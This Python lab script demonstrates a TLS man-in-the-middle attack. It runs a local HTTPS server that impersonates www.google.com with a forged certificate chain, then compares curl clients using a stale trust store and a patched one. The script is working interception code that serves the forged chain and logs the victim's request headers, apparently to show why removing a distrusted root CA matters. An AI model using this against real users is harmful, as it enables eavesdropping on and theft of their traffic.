#!/usr/bin/env python3
"""
Step 3 -- The MITM: same forged cert, two different trust stores.

The "attacker" runs an HTTPS endpoint that impersonates www.google.com using
the forged certificate chain (leaf signed by the weak-key intermediate).

Two "victims" connect to it (curl resolves www.google.com to 127.0.0.1 in
this lab):

  * STALE victim   -- frozen ca-bundle that still contains the emSign-like
                      root + intermediate, and (like most embedded software)
                      performs NO revocation checking.
                      Result: the forged chain validates. The attacker
                      decrypts and logs the victim's traffic.

  * PATCHED victim -- updated bundle where the emSign-like root was removed
                      (the OneCRL / NSS 3.131.1 / distro-bundle behavior).
                      Result: handshake fails. The attacker logs nothing.

Run: python3 mitm_demo.py
"""

import http.server
import os
import ssl
import subprocess
import sys
import threading
import time

HERE = os.path.dirname(os.path.abspath(__file__))
TRUST = os.path.join(HERE, "..", "trust")
STALE_BUNDLE = os.path.join(TRUST, "stale-ca-bundle.pem")
PATCHED_BUNDLE = os.path.join(TRUST, "patched-ca-bundle.pem")
LEAF_CHAIN = os.path.join(TRUST, "forged-www.google.com.pem")
LEAF_KEY = os.path.join(HERE, "..", "keys", "leaf_key.pem")

HOST, PORT = "127.0.0.1", 8443
VICTIM_DOMAIN = "www.google.com"

captured = []


class AttackerHandler(http.server.BaseHTTPRequestHandler):
    """The MITM endpoint: logs everything the victim sends."""

    def do_GET(self):
        captured.append(self.requestline + "\n" + str(self.headers))
        body = (
            b"<html><body><h1>Impersonated " + VICTIM_DOMAIN.encode()
            + b"</h1><p>The 'victim' believed it was talking to "
            + VICTIM_DOMAIN.encode()
            + b". It was talking to the attacker.</p></body></html>"
        )
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass


def curl_victim(bundle_path, label):
    """Run the victim client against the attacker with the given trust store."""
    cmd = [
        "curl",
        "-s",
        "-o", "/dev/null",
        "-w", "%{http_code}",
        "--resolve", f"{VICTIM_DOMAIN}:{PORT}:127.0.0.1",
        "--cacert", bundle_path,
        f"https://{VICTIM_DOMAIN}:{PORT}/",
        "--connect-timeout", "5",
        "-m", "8",
    ]
    print(f"\n--- Victim '{label}' (bundle: {os.path.basename(bundle_path)}) ---")
    print("    $ curl --resolve www.google.com:8443:127.0.0.1 --cacert <bundle> https://www.google.com:8443/")
    proc = subprocess.run(cmd, capture_output=True, text=True)
    ok = proc.returncode == 0
    print(f"    curl exit code : {proc.returncode}")
    if ok:
        print(f"    HTTP status    : {proc.stdout}")
    else:
        # Keep only the human-meaningful part of curl's TLS error
        err = [l for l in proc.stderr.splitlines() if "error" in l.lower() or "alert" in l.lower() or "certificate" in l.lower()]
        tail = proc.stderr.strip().splitlines() if proc.stderr.strip() else []
        print("    TLS outcome    : " + (err[0].strip() if err else (tail[-1] if tail else "handshake rejected (no stderr detail)")))
    return ok


def main():
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(LEAF_CHAIN, LEAF_KEY)  # serves leaf + intermediate chain

    server = http.server.HTTPServer((HOST, PORT), AttackerHandler)
    server.socket = ctx.wrap_socket(server.socket, server_side=True)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    print(f"[*] Attacker HTTPS endpoint serving forged chain on https://{VICTIM_DOMAIN}:{PORT} (lab DNS override)")

    stale_ok = curl_victim(STALE_BUNDLE, "STALE trust store (frozen ca-bundle, no revocation checks)")
    patched_ok = curl_victim(PATCHED_BUNDLE, "PATCHED trust store (emSign-like root removed)")

    print("\n================ ATTACKER'S CAPTURE BUFFER ================")
    if captured:
        for entry in captured:
            print(">>> captured request:\n" + entry)
        print(">>> The stale-trust victim's traffic was read by the attacker.")
    else:
        print(">>> nothing captured.")
    print("===========================================================")

    print("\nSummary:")
    print(f"  STALE  victim -> {'IMPERSONATED: attacker read the traffic' if stale_ok else 'not vulnerable'}")
    print(f"  PATCHED victim -> {'IMPERSONATED (unexpected!)' if patched_ok else 'protected: TLS handshake rejected'}")
    server.shutdown()
    return 0 if stale_ok and not patched_ok else 1


if __name__ == "__main__":
    sys.exit(main())
